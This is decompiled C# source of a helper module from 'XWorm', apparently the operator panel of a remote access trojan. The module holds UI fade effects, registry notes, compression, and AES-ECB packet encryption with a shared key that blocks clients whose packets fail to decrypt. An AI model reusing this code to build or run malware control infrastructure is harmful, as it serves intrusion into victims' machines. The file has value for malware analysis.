#define DEBUG
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Toolbelt.Drawing;
using XWorm.My;

namespace XWorm;

[StandardModule]
internal sealed class Module0
{
	public struct SHFILEINFO
	{
		public IntPtr hIcon;

		public int iIcon;

		public int dwAttributes;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string szDisplayName;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
		public string szTypeName;
	}

	public enum IconSize
	{
		SHGFI_LARGEICON,
		SHGFI_SMALLICON
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_27_FadeIn : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal Form _0024VB_0024Local_o;

		internal int _0024VB_0024Local_interval;

		internal Form _0024S0;

		internal Exception _0024VB_0024ResumableLocal_ex_00241;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if ((uint)num <= 1u)
				{
				}
				try
				{
					if (num != 0)
					{
						if (num != 1)
						{
							goto IL_0040;
						}
						num = -1;
						_0024State = -1;
						return;
					}
					num = -1;
					_0024State = -1;
					TaskAwaiter awaiter = _0024A0;
					_0024A0 = default(TaskAwaiter);
					goto IL_0072;
				IL_0040:
					if (_0024VB_0024Local_o.Opacity < 1.0)
					{
						awaiter = Task.Delay(_0024VB_0024Local_interval).GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = 0;
							_0024State = 0;
							_0024A0 = awaiter;
							ref AsyncVoidMethodBuilder reference = ref _0024Builder;
							VB_0024StateMachine_27_FadeIn stateMachine = this;
							reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
							return;
						}
						goto IL_0072;
					}
					_0024VB_0024Local_o.Opacity = 1.0;
					goto end_IL_000b;
				IL_0072:
					awaiter.GetResult();
					awaiter = default(TaskAwaiter);
					(_0024S0 = _0024VB_0024Local_o).Opacity = _0024S0.Opacity + 0.05;
					goto IL_0040;
				end_IL_000b:;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					_0024VB_0024ResumableLocal_ex_00241 = ex2;
					Debug.WriteLine(_0024VB_0024ResumableLocal_ex_00241.Message);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_28_FadeInMain : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal Form _0024VB_0024Local_o;

		internal int _0024VB_0024Local_interval;

		internal Form _0024S0;

		internal Exception _0024VB_0024ResumableLocal_ex_00241;

		internal Exception _0024VB_0024ResumableLocal_ex_00242;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if ((uint)num <= 1u)
				{
				}
				try
				{
					if (num != 0)
					{
						if (num != 1)
						{
							goto IL_0040;
						}
						num = -1;
						_0024State = -1;
						return;
					}
					num = -1;
					_0024State = -1;
					TaskAwaiter awaiter = _0024A0;
					_0024A0 = default(TaskAwaiter);
					goto IL_0075;
				IL_0040:
					if (_0024VB_0024Local_o.Opacity < 1.0)
					{
						awaiter = Task.Delay(_0024VB_0024Local_interval).GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = 0;
							_0024State = 0;
							_0024A0 = awaiter;
							ref AsyncVoidMethodBuilder reference = ref _0024Builder;
							VB_0024StateMachine_28_FadeInMain stateMachine = this;
							reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
							return;
						}
						goto IL_0075;
					}
					try
					{
						MyProject.Computer.Audio.Play(Path.Combine(Application.StartupPath, "Sounds", "Intro.wav"));
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						_0024VB_0024ResumableLocal_ex_00241 = ex2;
						Debug.WriteLine(_0024VB_0024ResumableLocal_ex_00241.Message);
						ProjectData.ClearProjectError();
					}
					_0024VB_0024Local_o.Opacity = 1.0;
					Main.bool_0 = true;
					goto end_IL_000b;
				IL_0075:
					awaiter.GetResult();
					awaiter = default(TaskAwaiter);
					(_0024S0 = _0024VB_0024Local_o).Opacity = _0024S0.Opacity + 0.05;
					goto IL_0040;
				end_IL_000b:;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					_0024VB_0024ResumableLocal_ex_00242 = ex4;
					Debug.WriteLine(_0024VB_0024ResumableLocal_ex_00242.Message);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception exception = ex5;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	public const int int_0 = 256;

	public const int int_1 = 128;

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool InternetGetConnectedState(out int Description, int ReservedValue);

	public static bool smethod_0()
	{
		int Description;
		return InternetGetConnectedState(out Description, 0);
	}

	public static DateTime smethod_1(long unixtime)
	{
		DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
		try
		{
			dateTime = dateTime.AddSeconds(unixtime).ToLocalTime();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			dateTime = DateTime.MaxValue;
			ProjectData.ClearProjectError();
		}
		return dateTime;
	}

	public static string smethod_2(string Type)
	{
		string text2;
		try
		{
			RegistryKey classesRoot = Microsoft.Win32.Registry.ClassesRoot;
			RegistryKey registryKey = classesRoot.OpenSubKey(Path.GetExtension(Type), writable: false);
			string name = registryKey.GetValue("", "").ToString();
			RegistryKey registryKey2 = classesRoot.OpenSubKey(name);
			string text = registryKey2.GetValue("", "").ToString();
			registryKey2.Close();
			registryKey.Close();
			classesRoot.Close();
			text2 = text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			text2 = null;
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text2, null, TextCompare: false) == 0)
		{
			string text3 = Path.GetExtension(Type).Replace(".", "").ToUpper();
			if (Operators.CompareString(text3, null, TextCompare: false) == 0)
			{
				return "File";
			}
			return text3 + " File";
		}
		return text2;
	}

	public static object smethod_3(string str, Color Color)
	{
		try
		{
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = DateTime.Now.ToLongTimeString();
			listViewItem.ForeColor = Color;
			listViewItem.SubItems.Add(str);
			MyProject.Forms.Main.Lv2.Items.Insert(0, listViewItem);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public static string smethod_4(string ID)
	{
		string result;
		try
		{
			string text = Conversions.ToString(Microsoft.Win32.Registry.GetValue(GClass19.string_4 + "\\Notes", ID, null));
			result = ((!string.IsNullOrEmpty(text)) ? text : "Null");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = "Error";
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string smethod_5(string ID, string Str)
	{
		try
		{
			Microsoft.Win32.Registry.SetValue(GClass19.string_4 + "\\Notes", ID, Str);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
		string result = default(string);
		return result;
	}

	public static byte[] smethod_6(string s)
	{
		return Encoding.UTF8.GetBytes(s);
	}

	public static string smethod_7(byte[] b)
	{
		return Encoding.UTF8.GetString(b);
	}

	public static byte[] smethod_8(byte[] input)
	{
		using MemoryStream memoryStream = new MemoryStream(input);
		byte[] array = new byte[4];
		memoryStream.Read(array, 0, 4);
		int num = BitConverter.ToInt32(array, 0);
		using GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array2 = new byte[checked(num - 1 + 1)];
		gZipStream.Read(array2, 0, num);
		return array2;
	}

	public static byte[] smethod_9(byte[] input)
	{
		using MemoryStream memoryStream = new MemoryStream();
		byte[] bytes = BitConverter.GetBytes(input.Length);
		memoryStream.Write(bytes, 0, 4);
		using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress))
		{
			gZipStream.Write(input, 0, input.Length);
			gZipStream.Flush();
		}
		return memoryStream.ToArray();
	}

	public static string smethod_10(string f)
	{
		using FileStream inputStream = File.OpenRead(f);
		return BitConverter.ToString(new SHA256Managed().ComputeHash(inputStream)).Replace("-", string.Empty);
	}

	public static string smethod_11(long byteCount)
	{
		string[] array = new string[7] { "B", "KB", "MB", "GB", "TB", "PB", "EB" };
		if (byteCount == 0L)
		{
			return "0" + array[0];
		}
		long num = Math.Abs(byteCount);
		int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
		double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
		return (double)Math.Sign(byteCount) * num3 + array[num2];
	}

	public static byte[] smethod_12(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(smethod_6(GClass19.string_1));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Debug.WriteLine("AES_Encryptor" + ex2.Message);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static byte[] smethod_13(byte[] input, GClass5 C = null)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(smethod_6(GClass19.string_1));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Debug.WriteLine("AES_Decryptor" + ex2.Message);
			if (C.bool_0 && !GClass19.strings_0.Contains(C.string_0.ToString().Split(':')[0]))
			{
				GClass19.strings_0.Add(C.string_0.ToString().Split(':')[0]);
				C.method_3();
				ProjectData.ClearProjectError();
				return result;
			}
			ProjectData.ClearProjectError();
		}
		return null;
	}

	public static object smethod_14(int Input)
	{
		if (Input >= 1024)
		{
			return Strings.FormatNumber((double)Input / 1024.0, 1) + " GHz";
		}
		if (Input >= 0 && Input <= 1023)
		{
			return Strings.FormatNumber(Input, 1) + " MHz";
		}
		return "????";
	}

	public static string smethod_15(int inSeconds)
	{
		string result;
		try
		{
			int num = inSeconds % 60;
			inSeconds = checked((int)Math.Round((double)(inSeconds - num) / 60.0));
			int num2 = inSeconds % 60;
			inSeconds = checked((int)Math.Round((double)(inSeconds - num2) / 60.0));
			int num3 = inSeconds % 24;
			inSeconds = checked((int)Math.Round((double)(inSeconds - num3) / 24.0));
			int num4 = inSeconds;
			result = Conversions.ToString(num4) + "d " + Conversions.ToString(num3) + "h " + Conversions.ToString(num2) + "m " + Conversions.ToString(num) + "s";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = "Error";
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("shell32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr SHGetFileInfo(string pszPath, int dwFileAttributes, ref SHFILEINFO psfi, int cbFileInfo, int uFlags);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool DestroyIcon(IntPtr hIcon);

	public static Bitmap smethod_16(string fileExt, IconSize ICOsize = IconSize.SHGFI_SMALLICON)
	{
		Bitmap result = default(Bitmap);
		try
		{
			SHFILEINFO psfi = default(SHFILEINFO);
			psfi.szDisplayName = new string('\0', 260);
			psfi.szTypeName = new string('\0', 80);
			SHGetFileInfo(fileExt, 128, ref psfi, Marshal.SizeOf((object)psfi), (int)((IconSize)256 | ICOsize | (IconSize)16));
			Bitmap bitmap = Icon.FromHandle(psfi.hIcon).ToBitmap();
			DestroyIcon(psfi.hIcon);
			result = bitmap;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string smethod_17(string path)
	{
		try
		{
			string text = Path.GetTempFileName() + ".ico";
			using (FileStream stream = new FileStream(text, FileMode.Create))
			{
				IconExtractor.Extract1stIconTo(path, stream);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_27_FadeIn))]
	[DebuggerStepThrough]
	public static void smethod_18(Form o, int interval = 80)
	{
		VB_0024StateMachine_27_FadeIn stateMachine = new VB_0024StateMachine_27_FadeIn();
		stateMachine._0024VB_0024Local_o = o;
		stateMachine._0024VB_0024Local_interval = interval;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_28_FadeInMain))]
	[DebuggerStepThrough]
	public static void smethod_19(Form o, int interval = 80)
	{
		VB_0024StateMachine_28_FadeInMain stateMachine = new VB_0024StateMachine_28_FadeInMain();
		stateMachine._0024VB_0024Local_o = o;
		stateMachine._0024VB_0024Local_interval = interval;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}
}